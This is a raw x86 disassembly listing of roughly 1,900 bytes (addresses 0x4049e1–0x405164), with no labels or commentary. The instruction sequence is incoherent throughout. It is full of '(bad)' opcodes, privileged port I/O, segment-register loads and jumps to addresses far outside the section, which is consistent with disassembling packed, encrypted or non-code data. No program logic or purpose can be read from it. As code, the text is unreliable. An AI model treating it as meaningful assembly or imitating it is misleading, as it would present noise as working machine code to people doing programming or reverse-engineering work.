  4049e1:	mov    cl,0x9a
  4049e3:	jl     0x404a00
  4049e5:	xor    DWORD PTR [ebp-0x64],ecx
  4049e8:	pop    ebp
  4049e9:	adc    DWORD PTR [ebp+0x639fbf50],ecx
  4049ef:	mov    ecx,0x565b65f1
  4049f4:	and    al,0x8c
  4049f6:	jne    0x40499e
  4049f8:	gs dec edi
  4049fa:	and    BYTE PTR [edx+0x75],dh
  4049fd:	fs retf 
  4049ff:	dec    esi
  404a00:	aam    0x31
  404a02:	jg     0x404a20
  404a04:	mov    ds:0x9ca468fe,al
  404a09:	jbe    0x404a6d
  404a0b:	imul   BYTE PTR [edx]
  404a0d:	int3   
  404a0e:	add    BYTE PTR [esi-0x1b],0xad
  404a12:	push   ecx
  404a13:	mov    ds,WORD PTR [eax]
  404a15:	imul   ebx,DWORD PTR [edx],0x13
  404a18:	ins    DWORD PTR es:[edi],dx
  404a19:	jbe    0x404a49
  404a1b:	add    edx,DWORD PTR [edi-0x43]
  404a1e:	std    
  404a1f:	les    ebp,FWORD PTR [esi-0x58]
  404a22:	lods   al,BYTE PTR ds:[esi]
  404a23:	dec    eax
  404a24:	dec    edi
  404a25:	push   cs
  404a26:	inc    ecx
  404a27:	fcomp  DWORD PTR [edx-0xb9cdd32]
  404a2d:	mov    dh,0x66
  404a2f:	and    al,0xac
  404a31:	dec    esp
  404a32:	and    bl,BYTE PTR [ecx+0x31dcc0b3]
  404a38:	pusha  
  404a39:	mov    ds:0x67c23d50,al
  404a3e:	lds    ecx,FWORD PTR ss:[edi+0x7a82d2e9]
  404a45:	jmp    0xfc70a155
  404a4a:	into   
  404a4b:	cmp    BYTE PTR [ebx],bh
  404a4d:	cmc    
  404a4e:	mov    ds:0x4236ab1e,eax
  404a53:	xor    al,0x9a
  404a55:	cwde   
  404a56:	pushf  
  404a57:	pop    es
  404a58:	in     al,0x8a
  404a5a:	out    dx,al
  404a5b:	stos   BYTE PTR es:[edi],al
  404a5c:	and    BYTE PTR [ebx-0x62257bb3],ah
  404a62:	std    
  404a63:	mov    ebp,0xce09defb
  404a68:	ja     0x404a0c
  404a6a:	popa   
  404a6b:	sub    ch,BYTE PTR [ebp+eax*2-0x57]
  404a6f:	mov    eax,0x956730b9
  404a74:	adc    ch,dh
  404a76:	sub    ecx,DWORD PTR cs:[edi]
  404a79:	mov    ah,0x32
  404a7b:	mov    eax,ds:0xe0ac1af4
  404a80:	neg    esi
  404a82:	sub    BYTE PTR [esi],ah
  404a84:	cmp    BYTE PTR [ebp+0x1d34920b],dl
  404a8a:	cwde   
  404a8b:	pop    ds
  404a8c:	ins    DWORD PTR es:[edi],dx
  404a8d:	xchg   DWORD PTR [eax],esp
  404a8f:	in     al,0x73
  404a91:	pop    ebp
  404a92:	jge    0x404af5
  404a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a95:	sbb    bh,dh
  404a97:	pop    ebx
  404a98:	and    ebp,eax
  404a9a:	pop    ecx
  404a9b:	jg     0x404ae3
  404a9d:	sub    ch,bh
  404a9f:	sub    eax,0x53863cb3
  404aa4:	inc    ecx
  404aa5:	test   DWORD PTR [ebx+eiz*1-0x36843b89],edi
  404aac:	xchg   ebp,eax
  404aad:	sub    eax,0xd3fad707
  404ab2:	mov    edx,0x7f85de50
  404ab7:	imul   edi,edi,0xd3cf68c5
  404abd:	sub    al,cl
  404abf:	test   DWORD PTR [esi],edi
  404ac1:	add    bh,0xa8
  404ac4:	dec    edx
  404ac5:	sub    dl,BYTE PTR [ebx+0x7fe66f44]
  404acb:	ds stc 
  404acd:	xchg   BYTE PTR [ebp+edx*1-0x87ef5cb],ah
  404ad4:	dec    esi
  404ad5:	cmp    BYTE PTR [edi+0x632c1c21],dh
  404adb:	sub    edx,ebx
  404add:	in     al,dx
  404ade:	popf   
  404adf:	and    ebx,eax
  404ae1:	inc    ebp
  404ae2:	(bad)  
  404ae3:	jbe    0x404b3e
  404ae5:	retf   
  404ae6:	push   esi
  404ae7:	cs int3 
  404ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aea:	pop    ss
  404aeb:	xchg   edi,eax
  404aec:	dec    ecx
  404aed:	mov    ah,0xe0
  404aef:	push   ebp
  404af0:	and    BYTE PTR [eax+0x7a],0xc4
  404af4:	jae    0x404b2a
  404af6:	mov    esp,0xf5aef522
  404afb:	fdivr  QWORD PTR [edi+eiz*4]
  404afe:	mov    esi,esp
  404b00:	mov    edx,0x6ac5c01
  404b05:	jae    0x404b77
  404b07:	popa   
  404b08:	bswap  esp
  404b0a:	mov    ch,0x3e
  404b0c:	enter  0xf431,0x5a
  404b10:	pop    ss
  404b11:	sar    ch,0x11
  404b14:	mov    dh,0xbc
  404b16:	mov    al,0xf7
  404b18:	out    0x81,eax
  404b1a:	loope  0x404ab7
  404b1c:	les    ebx,FWORD PTR ds:0xa8c246d0
  404b22:	inc    edi
  404b23:	jecxz  0x404b1e
  404b25:	push   esp
  404b26:	jb     0x404b90
  404b28:	(bad)  
  404b29:	jmp    DWORD PTR [ebx]
  404b2b:	jecxz  0x404ab3
  404b2d:	mov    al,0x1d
  404b2f:	out    0x4f,al
  404b31:	fs add al,0x35
  404b34:	ss cli 
  404b36:	xchg   ebx,eax
  404b37:	rcr    DWORD PTR [ebx+0x34d579c4],cl
  404b3d:	es cs push 0x10bcafd7
  404b44:	je     0x404b27
  404b46:	dec    edx
  404b47:	jb     0x404b88
  404b49:	das    
  404b4a:	test   al,0xd4
  404b4c:	mov    al,ds:0x9ae6f857
  404b51:	sbb    eax,0x43ad35f5
  404b56:	push   ebx
  404b57:	xor    al,0x38
  404b59:	mov    WORD PTR [edx],ss
  404b5b:	jg     0x404b09
  404b5d:	cmp    ecx,DWORD PTR [ebx]
  404b5f:	inc    ebx
  404b60:	femms  
  404b62:	jge    0x404b06
  404b64:	popf   
  404b65:	xor    dh,BYTE PTR [ebx]
  404b67:	mov    bl,0xba
  404b69:	cdq    
  404b6a:	loope  0x404bab
  404b6c:	fdiv   DWORD PTR ds:0x99e6b9fa
  404b72:	push   0x47
  404b74:	mov    ebp,0xcaaa7198
  404b79:	iret   
  404b7a:	ror    BYTE PTR [edx+0x2d759c44],1
  404b80:	push   esi
  404b81:	mov    DWORD PTR [ebx+0x79],edi
  404b84:	sbb    DWORD PTR gs:[edx-0x30831f8b],0xfa09215
  404b8f:	movntq QWORD PTR [esi-0x4a81e021],mm0
  404b96:	inc    ebp
  404b97:	ds and ebp,ebx
  404b9a:	out    0xf8,eax
  404b9c:	sbb    ecx,DWORD PTR [ecx-0x5b4d7fd8]
  404ba2:	cdq    
  404ba3:	jne    0x404b3a
  404ba5:	mov    cl,0x8e
  404ba7:	scas   al,BYTE PTR es:[edi]
  404ba8:	sti    
  404ba9:	out    0x5d,al
  404bab:	outs   dx,DWORD PTR ds:[esi]
  404bac:	adc    DWORD PTR [ecx+0x263a8cea],esp
  404bb2:	std    
  404bb3:	jmp    0xc3b7a5bd
  404bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb9:	xchg   ebp,eax
  404bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbb:	mov    bl,ch
  404bbd:	mov    BYTE PTR [ebp+0x29],al
  404bc0:	sub    al,0x78
  404bc2:	cmp    al,0x9e
  404bc4:	sbb    eax,0x9f81e62c
  404bc9:	fisttp QWORD PTR [eax]
  404bcb:	xchg   edi,eax
  404bcc:	sbb    al,0x25
  404bce:	sub    bl,BYTE PTR [edi-0x7ef00931]
  404bd4:	inc    edx
  404bd5:	jns    0x404c33
  404bd7:	stc    
  404bd8:	adc    al,0xd2
  404bda:	fcomi  st,st(3)
  404bdc:	mov    edx,0x58097183
  404be1:	or     DWORD PTR [edi-0x4e],eax
  404be4:	pop    esp
  404be5:	sbb    ch,BYTE PTR [esi+0xb01f6ae]
  404beb:	push   ebx
  404bec:	cmp    BYTE PTR [ebp+0x3],dh
  404bef:	adc    BYTE PTR [eax+0xc],dh
  404bf2:	arpl   WORD PTR [ecx-0x5],ax
  404bf5:	push   ebx
  404bf6:	mov    ebp,0x2030272
  404bfb:	sub    al,0xa9
  404bfd:	arpl   WORD PTR [esi-0x3666d9b5],bp
  404c03:	(bad)  
  404c04:	dec    edi
  404c05:	sbb    esi,esp
  404c07:	dec    ebx
  404c08:	cmp    ah,BYTE PTR [ecx]
  404c0a:	cld    
  404c0b:	cmp    al,0xa3
  404c0d:	add    cl,BYTE PTR [edx+ebx*2]
  404c10:	idiv   DWORD PTR [edi+0x5a]
  404c13:	push   esi
  404c14:	adc    DWORD PTR [ebx+0x799933e4],edi
  404c1a:	(bad)  
  404c1b:	es fldln2 
  404c1e:	inc    ebx
  404c1f:	xor    bl,BYTE PTR [edx+eax*1]
  404c22:	pop    edi
  404c23:	sbb    DWORD PTR [esi-0x779f048],0xffffffb3
  404c2a:	mov    eax,ds:0xfb6a809a
  404c2f:	inc    ebx
  404c30:	add    cl,al
  404c32:	rcl    BYTE PTR [eax],0x4c
  404c35:	jmp    0x404cad
  404c37:	adc    BYTE PTR [ebx+edi*8],ch
  404c3a:	sub    dh,BYTE PTR [esi+0x36]
  404c3d:	cwde   
  404c3e:	jecxz  0x404c36
  404c40:	inc    eax
  404c41:	out    dx,al
  404c42:	add    BYTE PTR [edi],cl
  404c44:	pop    es
  404c45:	in     eax,0xd8
  404c47:	shl    BYTE PTR [edi+edi*4-0x34a3cdbe],cl
  404c4e:	retf   0x7d69
  404c51:	jg     0x404cb4
  404c53:	test   DWORD PTR [edi-0x1ca9c3dc],ebp
  404c59:	mov    esi,0x101717c8
  404c5e:	inc    di
  404c60:	push   ecx
  404c61:	or     BYTE PTR [esi-0x57],cl
  404c64:	mov    BYTE PTR [eax-0x78387217],ch
  404c6a:	sbb    DWORD PTR [esi],esi
  404c6c:	(bad)  
  404c6d:	lea    eax,[eax-0x64]
  404c70:	std    
  404c71:	xor    ebx,0xffffffb2
  404c74:	idiv   BYTE PTR [ebx]
  404c76:	fisttp QWORD PTR [eax+ecx*1+0xb86cb8]
  404c7d:	rcl    DWORD PTR [edi-0x6b],cl
  404c80:	stos   DWORD PTR es:[edi],eax
  404c81:	rcl    BYTE PTR [ebp-0x41],cl
  404c84:	pop    ebx
  404c85:	and    ecx,DWORD PTR [eax-0x52]
  404c88:	in     eax,dx
  404c89:	sub    al,0x26
  404c8b:	data16 cmc 
  404c8d:	das    
  404c8e:	pop    esp
  404c8f:	lea    edi,[ebp+0x72]
  404c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c93:	cmp    bh,al
  404c95:	jno    0x404cc7
  404c97:	sub    eax,0x6fb3b962
  404c9c:	add    eax,0x9957801
  404ca1:	xchg   esi,eax
  404ca2:	repz lea eax,[esi-0x66139a0e]
  404ca9:	dec    edi
  404caa:	je     0x404c7d
  404cac:	ins    BYTE PTR es:[edi],dx
  404cad:	cmp    ebx,edx
  404caf:	xchg   ebp,eax
  404cb0:	call   0xa311fe35
  404cb5:	xor    al,0xb9
  404cb7:	repnz ficomp DWORD PTR [esi]
  404cba:	(bad)
  404cbe:	add    BYTE PTR [ebx+0x77],bh
  404cc1:	dec    edi
  404cc2:	fisub  DWORD PTR [edi+0x58]
  404cc5:	lds    edx,FWORD PTR [ecx+0x7e]
  404cc8:	test   eax,0xfeea228a
  404ccd:	mov    BYTE PTR [ecx-0x5e0a5a98],bh
  404cd3:	xlat   BYTE PTR ds:[ebx]
  404cd4:	jl     0x404cef
  404cd6:	xchg   ebp,eax
  404cd7:	(bad)  
  404cd8:	xor    al,0xc
  404cda:	shr    al,cl
  404cdc:	or     eax,0x89c4344
  404ce1:	add    edx,DWORD PTR [ecx]
  404ce3:	inc    ebp
  404ce4:	or     eax,DWORD PTR [ebp+0x39]
  404ce7:	cmp    al,0x72
  404ce9:	sub    al,BYTE PTR [edi-0x21]
  404cec:	frstor [ecx+0x7]
  404cef:	in     al,dx
  404cf0:	daa    
  404cf1:	iret   
  404cf2:	cmc    
  404cf3:	push   ebx
  404cf4:	aam    0xe7
  404cf6:	js     0x404cf2
  404cf8:	dec    edi
  404cf9:	add    ah,ch
  404cfb:	add    ah,bh
  404cfd:	add    al,BYTE PTR [ecx+0x17]
  404d00:	sub    BYTE PTR [ebp+0x64],ch
  404d03:	sahf   
  404d04:	mov    ch,0x75
  404d06:	or     DWORD PTR ds:0xe50b3829,0xbe63c7c3
  404d10:	ins    BYTE PTR es:[edi],dx
  404d11:	test   BYTE PTR [edx-0x6e26a792],0x62
  404d18:	aad    0x56
  404d1a:	in     al,0xd6
  404d1c:	cwde   
  404d1d:	(bad)  
  404d1e:	jns    0x404d6f
  404d20:	adc    edi,DWORD PTR [ecx+0x5c]
  404d23:	outs   dx,DWORD PTR ds:[esi]
  404d24:	jno    0x404d29
  404d26:	mov    edx,DWORD PTR [ecx]
  404d28:	mov    esi,0xa3aa0d91
  404d2d:	lock pop eax
  404d2f:	xor    ebx,DWORD PTR [ebp-0x18]
  404d32:	inc    eax
  404d33:	and    al,0x3
  404d35:	push   esi
  404d36:	out    dx,eax
  404d37:	sahf   
  404d38:	in     eax,0x87
  404d3a:	cmp    al,0x6e
  404d3c:	pop    ecx
  404d3d:	ins    DWORD PTR es:[edi],dx
  404d3e:	mov    bl,0x5
  404d40:	sub    al,BYTE PTR [edx]
  404d42:	jmp    0xd2c9fd13
  404d47:	adc    eax,0xe70901dc
  404d4c:	lds    ecx,FWORD PTR [eax-0x5cead865]
  404d52:	add    al,al
  404d54:	xor    BYTE PTR [ebx],0xc9
  404d57:	test   BYTE PTR [eax+0x7451888e],dl
  404d5d:	pop    eax
  404d5e:	cmovbe ebx,ecx
  404d61:	call   ecx
  404d63:	or     al,0x18
  404d65:	xchg   ebx,eax
  404d66:	or     esi,DWORD PTR [ebp+0x5c]
  404d69:	les    edi,FWORD PTR [ebx-0x9]
  404d6c:	cmp    bh,BYTE PTR [ebp-0x13]
  404d6f:	pop    ds
  404d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d71:	pop    edx
  404d72:	scas   eax,DWORD PTR es:[edi]
  404d73:	jp     0x404d70
  404d75:	scas   al,BYTE PTR es:[edi]
  404d76:	push   esi
  404d77:	jmp    0x404d6b
  404d79:	jl     0x404ded
  404d7b:	cli    
  404d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d7d:	xchg   esi,eax
  404d7e:	mov    edi,DWORD PTR [eax+0x6557a02b]
  404d84:	xchg   edi,eax
  404d85:	sub    eax,0x5609f8df
  404d8a:	imul   ecx,DWORD PTR [ebp-0x13c06fea],0xffffffd8
  404d91:	jnp    0x404d81
  404d93:	rcl    edx,1
  404d95:	push   0xc62edaf4
  404d9a:	or     ecx,eax
  404d9c:	xchg   ebp,eax
  404d9d:	ret    
  404d9e:	retf   
  404d9f:	scas   al,BYTE PTR es:[edi]
  404da0:	mov    dl,ch
  404da2:	mov    DWORD PTR [edx-0x7e],0xe8eca227
  404da9:	repz jae 0x404d8c
  404dac:	aas    
  404dad:	jmp    0x8234af1
  404db2:	addr16 mov ebp,0x8f20a89e
  404db8:	sub    ah,ah
  404dba:	imul   bh
  404dbc:	test   eax,0xf7adaf9d
  404dc1:	push   ecx
  404dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dc3:	outs   dx,BYTE PTR ds:[esi]
  404dc4:	in     eax,dx
  404dc5:	adc    eax,0xb6a89df0
  404dca:	neg    edx
  404dcc:	pop    es
  404dcd:	loope  0x404dfb
  404dcf:	cs cmp edx,eax
  404dd2:	sbb    BYTE PTR [edx-0x71],al
  404dd5:	adc    BYTE PTR [ebx-0x1ae61fe9],ch
  404ddb:	aas    
  404ddc:	ja     0x404e09
  404dde:	push   0x5d
  404de0:	prefetchnta BYTE PTR [edi+0x7160b3ff]
  404de7:	leave  
  404de8:	or     DWORD PTR [eax],edx
  404dea:	in     ax,0x34
  404ded:	mov    al,0x7f
  404def:	cmc    
  404df0:	xor    BYTE PTR [edx],dl
  404df2:	xlat   BYTE PTR ds:[ebx]
  404df3:	popa   
  404df4:	sbb    DWORD PTR [ebp+0x77],esp
  404df7:	push   eax
  404df8:	xlat   BYTE PTR ds:[ebx]
  404df9:	push   ds
  404dfa:	dec    esi
  404dfb:	scas   eax,DWORD PTR es:[edi]
  404dfc:	pop    ebp
  404dfd:	loopne 0x404e19
  404dff:	mov    ebx,0x89670dd5
  404e04:	aam    0xc3
  404e06:	stc    
  404e07:	loope  0x404df8
  404e09:	cs add eax,0x7e28c5f5
  404e0f:	xor    eax,0x4d4e729e
  404e14:	dec    ecx
  404e15:	gs or  ch,ah
  404e18:	cs xchg ebp,eax
  404e1a:	xor    ebp,edi
  404e1c:	jno    0x404dc3
  404e1e:	scas   al,BYTE PTR es:[edi]
  404e1f:	test   bh,dh
  404e21:	jmp    0x49f2:0x36529321
  404e28:	sbb    al,0xf8
  404e2a:	add    DWORD PTR [edi-0x8],esp
  404e2d:	jmp    0x55faf0f8
  404e32:	(bad)  
  404e33:	pop    ebp
  404e34:	cld    
  404e35:	sbb    ebp,DWORD PTR [ebx]
  404e37:	vprotb xmm5,xmm0,[eax+0x2d]
  404e3d:	jno    0x404e8b
  404e3f:	icebp  
  404e40:	test   ecx,esi
  404e42:	push   edi
  404e43:	in     al,0xeb
  404e45:	shl    ebx,1
  404e47:	jb     0x404e40
  404e49:	outs   dx,DWORD PTR ds:[esi]
  404e4a:	inc    ecx
  404e4b:	pop    ss
  404e4c:	fsub   QWORD PTR [edi]
  404e4e:	enter  0x678,0x2f
  404e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e53:	mov    ch,0x40
  404e55:	pop    ecx
  404e56:	add    edx,DWORD PTR [edi]
  404e58:	(bad)  
  404e59:	sub    al,0xad
  404e5b:	jae    0x404e74
  404e5d:	rol    DWORD PTR [esi-0x2a],1
  404e60:	pop    edi
  404e61:	adc    bl,dl
  404e63:	add    BYTE PTR [esi-0x1dccfd23],cl
  404e69:	xchg   edi,eax
  404e6a:	push   ebp
  404e6b:	pop    ecx
  404e6c:	fdivrp st(5),st
  404e6e:	and    DWORD PTR [ecx+0x37],ecx
  404e71:	xchg   esp,eax
  404e72:	loope  0x404e54
  404e74:	mov    ebx,0x4edcbacb
  404e79:	dec    ebx
  404e7a:	and    al,0x10
  404e7c:	in     eax,0x2
  404e7e:	push   ebx
  404e7f:	mov    ebx,0x646b62bf
  404e84:	and    al,0x93
  404e86:	aaa    
  404e87:	adc    ecx,DWORD PTR [ebp-0x2a]
  404e8a:	push   0x8
  404e8c:	iret   
  404e8d:	adc    DWORD PTR [ebp-0xa0c3d15],ebp
  404e93:	fidiv  WORD PTR [ebx+ebx*1]
  404e96:	daa    
  404e97:	out    dx,al
  404e98:	adc    BYTE PTR [ebx+ecx*2-0x75],0xad
  404e9d:	mov    WORD PTR [ecx+0x6e],?
  404ea0:	push   eax
  404ea1:	fnsave [esp+edx*1]
  404ea4:	or     dh,BYTE PTR [ebp-0x4d680058]
  404eaa:	out    dx,al
  404eab:	push   ebp
  404eac:	sbb    al,0x55
  404eae:	lahf   
  404eaf:	loopne 0x404f26
  404eb1:	add    BYTE PTR [eax],ah
  404eb3:	int    0xe1
  404eb5:	jmp    0x404e53
  404eb7:	pop    ebp
  404eb8:	or     ebp,edx
  404eba:	push   es
  404ebb:	inc    esp
  404ebc:	stos   BYTE PTR es:[edi],al
  404ebd:	test   eax,0x5b532357
  404ec2:	xchg   DWORD PTR [ebx+0x27f4de1a],ecx
  404ec8:	bnd call 0x3b3a4f00
  404ece:	outs   dx,DWORD PTR ds:[esi]
  404ecf:	or     ebx,DWORD PTR [esi+0x43]
  404ed2:	or     eax,0xd457afae
  404ed7:	ret    
  404ed8:	mov    dh,0x47
  404eda:	rcl    BYTE PTR ds:0xcb335f5f,cl
  404ee0:	jle    0x404f1f
  404ee2:	inc    edi
  404ee3:	int3   
  404ee4:	in     eax,0x9b
  404ee6:	js     0x404f31
  404ee8:	rcl    BYTE PTR [esi],cl
  404eea:	ins    DWORD PTR es:[edi],dx
  404eeb:	jmp    0x404f2e
  404eed:	xor    DWORD PTR [ecx+0x14],ebp
  404ef0:	xchg   ebp,eax
  404ef1:	mov    ebp,0x5826b6ac
  404ef6:	mov    dl,0xd
  404ef8:	fidivr WORD PTR [edx+0x53]
  404efb:	push   ecx
  404efc:	mov    esp,0x7c116f25
  404f01:	mov    al,0xc
  404f03:	stc    
  404f04:	jne    0x404f0e
  404f06:	mov    al,0x87
  404f08:	jmp    0x7f943222
  404f0d:	jle    0x404eb0
  404f0f:	out    dx,eax
  404f10:	pop    ebx
  404f11:	ret    
  404f12:	sub    BYTE PTR [edi+0x44],0x72
  404f16:	sbb    al,0x93
  404f18:	or     al,0xbd
  404f1a:	fist   DWORD PTR [esi]
  404f1c:	test   eax,0xea8dfcd4
  404f21:	cdq    
  404f22:	pop    esi
  404f23:	fst    DWORD PTR [ebx+0x16]
  404f26:	neg    DWORD PTR [edx+eiz*8]
  404f29:	push   edi
  404f2a:	sbb    eax,ebp
  404f2c:	popa   
  404f2d:	neg    BYTE PTR [esi]
  404f2f:	inc    esp
  404f30:	adc    ecx,DWORD PTR [eax+0x66]
  404f33:	xchg   edx,eax
  404f34:	jns    0x404f73
  404f36:	fimul  DWORD PTR [edi+0x43]
  404f39:	int    0xbc
  404f3b:	inc    ecx
  404f3c:	add    ch,0x5b
  404f3f:	or     al,0x97
  404f41:	push   edi
  404f42:	cmp    bh,BYTE PTR [esi-0x6a]
  404f45:	and    DWORD PTR [edi],esp
  404f47:	and    eax,0xb3523a26
  404f4c:	xchg   BYTE PTR [eax-0x69682595],dl
  404f52:	(bad)  
  404f53:	xor    al,0x30
  404f55:	mov    ebx,eax
  404f57:	mov    al,0x92
  404f59:	and    al,0x21
  404f5b:	dec    eax
  404f5c:	fistp  DWORD PTR [ebx-0x20dbf752]
  404f62:	jno    0x404f7a
  404f64:	shr    BYTE PTR [eax],cl
  404f66:	cli    
  404f67:	mov    ecx,0x8747f30d
  404f6c:	clc    
  404f6d:	inc    ecx
  404f6e:	lock push esi
  404f70:	inc    ecx
  404f71:	sbb    eax,0x8e4f5864
  404f76:	and    dh,BYTE PTR [eax+0x75]
  404f79:	sub    al,0xab
  404f7b:	test   BYTE PTR [ebx],dh
  404f7d:	lock xchg edi,eax
  404f7f:	cmp    edi,edi
  404f81:	retf   
  404f82:	ret    
  404f83:	xor    esi,DWORD PTR [esp+ecx*4]
  404f86:	shr    BYTE PTR [ebp+0x6e2dc552],1
  404f8c:	and    al,0xa3
  404f8e:	stc    
  404f8f:	dec    ah
  404f91:	pop    ds
  404f92:	dec    edi
  404f93:	popa   
  404f94:	sub    BYTE PTR [ebx],ah
  404f96:	(bad)  
  404f97:	dec    ebx
  404f98:	xchg   esp,eax
  404f99:	ins    BYTE PTR es:[edi],dx
  404f9a:	sar    DWORD PTR [eax],1
  404f9c:	idiv   dl
  404f9e:	inc    edi
  404f9f:	mov    edi,0xdddf91
  404fa4:	rol    DWORD PTR [edx+0x5a],0x42
  404fa8:	mov    ebp,DWORD PTR [esi]
  404faa:	jns    0x404fee
  404fac:	xchg   esi,eax
  404fad:	std    
  404fae:	pop    esp
  404faf:	adc    dh,cl
  404fb1:	sar    DWORD PTR [ebp-0x6a],cl
  404fb4:	pop    es
  404fb5:	ror    DWORD PTR [eax-0x29],0xf8
  404fb9:	inc    edx
  404fba:	pop    es
  404fbb:	out    dx,al
  404fbc:	jp     0x404f46
  404fbe:	sbb    DWORD PTR [eax+0x17e2ae91],0x71a0d3f0
  404fc8:	lea    edx,gs:[ebp+0x74d417d5]
  404fcf:	bound  ebx,QWORD PTR [esi+0x35d2fd0c]
  404fd5:	mov    cs,WORD PTR [ecx-0x14]
  404fd8:	mov    edx,DWORD PTR [ebx]
  404fda:	jl     0x404f68
  404fdc:	xchg   ecx,eax
  404fdd:	int    0xd6
  404fdf:	stc    
  404fe0:	push   esp
  404fe1:	push   edx
  404fe2:	in     eax,0x41
  404fe4:	test   al,0x5c
  404fe6:	add    BYTE PTR [edi+0x64],bh
  404fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fea:	outs   dx,DWORD PTR ds:[esi]
  404feb:	adc    ebp,eax
  404fed:	push   ebx
  404fee:	add    ecx,DWORD PTR [edi+0x79e5811f]
  404ff4:	js     0x40502a
  404ff6:	xchg   ebp,eax
  404ff7:	je     0x404fcf
  404ff9:	mov    edi,0x15969f78
  404ffe:	add    eax,0x2b408d81
  405003:	adc    dh,ch
  405005:	mov    cl,0x90
  405007:	jl     0x40507c
  405009:	cmp    eax,0xf2d714
  40500e:	ficom  WORD PTR ss:0x1e4a4562
  405015:	in     al,dx
  405016:	adc    eax,0x2f9fc78f
  40501b:	and    edi,ebx
  40501d:	jmp    0xe28bc2ee
  405022:	push   ebx
  405023:	enter  0x17bf,0xf8
  405027:	mov    DWORD PTR [edx+0x62f75bf8],esi
  40502d:	pop    edx
  40502e:	(bad)  
  40502f:	pop    ecx
  405030:	cmc    
  405031:	fiadd  WORD PTR [esi-0x4b8af039]
  405037:	pushf  
  405038:	mov    eax,ds:0x45ecdf46
  40503d:	xor    DWORD PTR [edx],esp
  40503f:	pushf  
  405040:	jo     0x405025
  405042:	leave  
  405043:	fucomp st(3)
  405045:	dec    esi
  405046:	cmp    eax,0x580356ee
  40504b:	pop    ds
  40504c:	mov    al,ds:0xd5f435aa
  405051:	push   eax
  405052:	loope  0x40504c
  405054:	jmp    0x40505d
  405056:	mov    esp,0xe79274d2
  40505b:	sti    
  40505c:	add    DWORD PTR [eax+0x6cc41e36],0x83f5f48f
  405066:	(bad)  
  405067:	in     eax,0xba
  405069:	jno    0x405010
  40506b:	adc    ebx,DWORD PTR [eax]
  40506d:	jbe    0x405016
  40506f:	jge    0x405077
  405071:	and    eax,DWORD PTR [ebx]
  405073:	pop    es
  405074:	mov    WORD PTR [edi],fs
  405076:	add    BYTE PTR [ecx+0x19363b08],ch
  40507c:	in     eax,0x12
  40507e:	push   ebp
  40507f:	outs   dx,DWORD PTR ds:[esi]
  405080:	mov    al,ds:0x7618c7a6
  405085:	mov    esi,0x87622ab4
  40508a:	out    dx,al
  40508b:	push   esi
  40508c:	xchg   DWORD PTR [eax],edx
  40508e:	scas   al,BYTE PTR es:[edi]
  40508f:	cwde   
  405090:	push   0x1d7f3b2
  405095:	test   eax,0xea0bec8f
  40509a:	push   0xffffff81
  40509c:	sub    al,0xb4
  40509e:	mov    al,0x3c
  4050a0:	mov    bh,BYTE PTR [edx-0x2f]
  4050a3:	cmp    al,0xe6
  4050a5:	sbb    eax,0x2a89920f
  4050aa:	xor    BYTE PTR [ecx-0x73],bh
  4050ad:	mov    DWORD PTR [esi+esi*1-0x5a],ebp
  4050b1:	xchg   esi,eax
  4050b2:	mov    edi,0x3aebd539
  4050b7:	ins    DWORD PTR es:[edi],dx
  4050b8:	popf   
  4050b9:	xchg   ecx,eax
  4050ba:	mov    dl,0x57
  4050bc:	push   edi
  4050bd:	jmp    0x7182ff08
  4050c2:	sub    eax,0xe29613aa
  4050c7:	dec    edi
  4050c8:	lods   eax,DWORD PTR ds:[esi]
  4050c9:	jb     0x405084
  4050cb:	fisttp DWORD PTR [edx-0x74]
  4050ce:	nop
  4050cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050d0:	fld    DWORD PTR [eax-0x6bcd6a59]
  4050d6:	in     eax,0x20
  4050d8:	jp     0x4050e1
  4050da:	fsubr  st(4),st
  4050dc:	inc    BYTE PTR [ecx]
  4050de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050df:	or     DWORD PTR [ecx-0x5bed745f],ebp
  4050e5:	retf   
  4050e6:	cdq    
  4050e7:	inc    ebp
  4050e8:	in     al,0x57
  4050ea:	test   DWORD PTR [edi-0x2846c84e],esi
  4050f0:	mov    ecx,0x19b1d8d7
  4050f5:	pop    esi
  4050f6:	inc    ecx
  4050f7:	cmp    ah,cl
  4050f9:	sub    eax,0xd2c013ff
  4050fe:	push   edx
  4050ff:	fnstcw WORD PTR [edi-0x7473b2c1]
  405105:	in     eax,dx
  405106:	mov    ch,0x2a
  405108:	cli    
  405109:	inc    esi
  40510a:	sub    DWORD PTR [esi+eax*4+0x4cb16fa4],esp
  405111:	pop    esp
  405112:	jge    0x4050bc
  405114:	loop   0x4050ce
  405116:	out    0x1,al
  405118:	scas   eax,DWORD PTR es:[edi]
  405119:	sub    bl,BYTE PTR [esi+edx*4-0x2b34a954]
  405120:	or     ebp,esi
  405122:	icebp  
  405123:	jb     0x405168
  405125:	jmp    0x405114
  405127:	dec    edi
  405128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405129:	add    al,0x7e
  40512b:	aad    0xbd
  40512d:	inc    edx
  40512e:	lods   al,BYTE PTR ds:[esi]
  40512f:	loopne 0x405149
  405131:	push   ds
  405132:	adc    al,0x4e
  405134:	mov    al,0x86
  405136:	test   al,0x3d
  405138:	jecxz  0x405177
  40513a:	jo     0x4050c7
  40513c:	pop    edx
  40513d:	mov    eax,ds:0x60c830f7
  405142:	int3   
  405143:	pop    ebx
  405144:	test   dh,dl
  405146:	or     esp,esi
  405148:	dec    ecx
  405149:	outs   dx,DWORD PTR ds:[esi]
  40514a:	lods   eax,DWORD PTR ds:[esi]
  40514b:	cdq    
  40514c:	jb     0x4050f6
  40514e:	mov    ds:0x4aafb197,eax
  405153:	ret    0x504f
  405156:	mov    dh,0xbc
  405158:	pusha  
  405159:	imul   DWORD PTR [ecx+0x1f]
  40515c:	fldcw  WORD PTR [esi+0x7ec83816]
  405162:	jo     0x405163
  405164:	mov    al,0xa8
